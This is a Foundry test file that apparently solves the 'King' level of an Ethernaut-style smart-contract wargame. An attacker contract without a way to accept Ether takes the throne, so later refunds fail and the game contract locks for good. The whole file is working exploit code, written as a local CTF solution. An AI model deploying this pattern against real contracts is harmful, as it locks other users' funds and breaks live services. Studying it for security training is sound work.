// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level9.sol";
import "forge-std/Test.sol";

contract ExploitLevel9 is Test {
    King instance;
    AttackKing attackKing;
    address owner = vm.addr(1);
    address user = vm.addr(2);

    function setUp() external {
        vm.deal(owner, 5 ether);
        vm.deal(user, 5 ether);

        console.log("Owner:", owner);
        console.log("User:", user);
        console.log("---------------------------");

        vm.prank(owner);
        instance = new King{value: 1 ether}();
        attackKing = new AttackKing(address(instance));
    }

    function testExploit() external {
        console.log("Initial King:", instance.owner());

        vm.prank(user);
        (bool success,) = address(instance).call{value: 2 ether}("");
        require(success, "call failed");
        console.log("New King:", instance._king());

        // Lock the instance so transfer() in instance.receive() always fail
        attackKing.attack{value: 3 ether}();

        vm.prank(user);
        vm.expectRevert();
        address(instance).call{value: 4 ether}("");
        console.log("Contract Locked");
    }
}

contract AttackKing {
    address instanceAddr;

    constructor(address _instance) {
        instanceAddr = _instance;
    }

    function attack() external payable {
        (bool success,) = instanceAddr.call{value: msg.value}("");
        require(success, "call failed");
    }
}
